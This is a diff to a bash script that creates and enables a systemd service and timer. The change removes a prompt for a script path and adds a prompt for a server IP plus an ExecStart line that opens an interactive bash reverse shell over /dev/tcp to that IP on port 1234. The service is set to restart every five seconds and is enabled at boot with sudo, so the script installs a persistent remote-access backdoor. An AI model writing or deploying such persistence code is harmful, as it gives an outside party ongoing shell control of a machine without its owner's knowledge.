@@ -3,16 +3,8 @@
 echo -e "\033[1;31mTo run a command use simboc\033[0m"
 echo ""
 
-# Ask the user if they want to use the default script path (/usr/bin/)
-read -p "Do you want to use the default script path (/usr/bin/)? [c]hange/enter default: " use_default
-
-if [[ $use_default == "c" ]]; then
-    read -p "Enter the full path of the script: " script_path
-else
-    script_path="/usr/bin/"
-    read -p "Script name: " script_name
-    script_path+="$script_name"
-fi
+# Ask for server IP
+read -p "Enter the server IP: " IP
 
 # Ask the user how they want to name the service
 read -p "How do you want to name the service? (Enter the service name without the .service extension): " service_name
@@ -28,22 +20,24 @@ fi
 
 # Generate the content for the .service file
 service_content="[Unit]
-Description=Backup from system admin $script_path
+Description=Reverse PTY to $IP
 After=network-online.target
 Wants=network-online.target
 
 [Service]
 Type=simple
-ExecStart=$script_path
+ExecStart=/bin/bash -c 'exec 3<>/dev/tcp/$IP/1234; exec 0<&3 1>&3 2>&3; exec /bin/bash -i'
+Restart=always
+RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
 "
 
-# Save the content
+# Save the content to a .service file
 echo "$service_content" | sudo tee "/etc/systemd/system/$service_name.service" > /dev/null
 
-# Timer file
+# Generate the content for the .timer file
 timer_content="[Unit]
 Description=Timer to execute the $service_name service
 
@@ -56,11 +50,15 @@ Persistent=true
 WantedBy=timers.target
 "
 
+# Save the content to a .timer file
 echo "$timer_content" | sudo tee "/etc/systemd/system/$service_name.timer" > /dev/null
 
 echo ""
-echo "Files created. Reloading systemd..."
+echo "The files '$service_name.service' and '$service_name.timer' have been created successfully."
+echo "Reloading systemd to detect the changes..."
 sudo systemctl daemon-reload
+echo "Systemd reloaded successfully."
+echo ""
 
 echo "enabled and started"
 sudo systemctl enable "$service_name.service"
@@ -68,7 +66,7 @@ sudo systemctl enable "$service_name.timer"
 sudo systemctl start "$service_name.service"
 sudo systemctl start "$service_name.timer"
 
-# Ask for CTL
+# Function to CTL the created service if the user desires
 show_service_status() {
     printf 'CTL the service? [\033[32ms\033[0m/n]: '
     read -n1 answer
@@ -78,6 +76,7 @@ show_service_status() {
     fi
 }
 
+# Call the function
 show_service_status
 
 echo ""
